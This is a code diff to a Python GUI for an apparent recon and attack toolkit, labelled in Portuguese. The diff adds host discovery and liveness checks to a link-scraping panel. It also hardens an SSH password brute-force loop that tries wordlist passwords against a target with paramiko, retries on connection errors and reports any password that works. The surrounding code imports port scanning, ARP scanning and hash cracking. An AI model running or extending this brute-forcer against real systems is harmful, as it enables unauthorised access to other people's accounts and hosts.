@@ -3,11 +3,10 @@ from tkinter import ttk, scrolledtext
 import threading
 import sys
 import io
-from recon import links, lista, diretorios, arp_scan, port_scan
+from sherlock import links, lista, diretorios, arp_scan, port_scan, extrair_hosts, verificar_hosts
 from ssh import ssh_bruteforce
 from cracker import wordlist_hash_cracker, ALGORITMOS_SUPORTADOS
 import requests
-import socket
 
 HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; recon-tool/1.0)"}
 
@@ -227,6 +226,22 @@ class LinksCard(Card):
                 for l in result:
                     self.output.insert_line(f"  {l}", "ok")
                 self.output.insert_line(f"\nTotal: {len(result)} links", "sep")
+
+                hosts = extrair_hosts(result)
+                if hosts:
+                    self.output.separator("hosts encontrados")
+                    for h in hosts:
+                        self.output.insert_line(f"  {h}", "ok")
+                    self.output.insert_line(f"\nTotal: {len(hosts)} hosts", "sep")
+
+                    self.output.separator("hosts ativos")
+                    ativos = verificar_hosts(hosts)
+                    if ativos:
+                        for h in ativos:
+                            self.output.insert_line(f"  {h['host']} -> {h['ip']}", "ok")
+                        self.output.insert_line(f"\nTotal: {len(ativos)} hosts ativos", "sep")
+                    else:
+                        self.output.insert_line("Nenhum host ativo encontrado.", "err")
             else:
                 self.output.insert_line("Nenhum link encontrado.", "err")
         self.run_threaded(fn)
@@ -550,19 +565,23 @@ class SshCard(Card):
                 if self._stopped:
                     self.output.insert_line("\n[!] Interrompido pelo usuário.", "sep")
                     break
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                try:
-                    ssh.connect(target, port=22, username=usuario, password=senha, timeout=5)
-                    ssh.close()
-                    self.output.insert_line(f"\n✔  SENHA ENCONTRADA: {senha}", "ok")
-                    encontrado = senha
-                    break
-                except paramiko.AuthenticationException:
-                    pass
-                except Exception as e:
-                    print(f"Erro inesperado: {type(e).__name__}: {e}")
-                    self.output.insert_line(f"Erro: {e}", "err")
+                tentativas = 0
+                while tentativas < 3:
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    try:
+                        ssh.connect(target, port=22, username=usuario, password=senha, timeout=5)
+                        ssh.close()
+                        self.output.insert_line(f"\n✔  SENHA ENCONTRADA: {senha}", "ok")
+                        encontrado = senha
+                        break
+                    except paramiko.AuthenticationException:
+                        break
+                    except Exception:
+                        tentativas += 1
+                        import time
+                        time.sleep(2)
+                if encontrado:
                     break
 
             if not self._stopped and not encontrado:
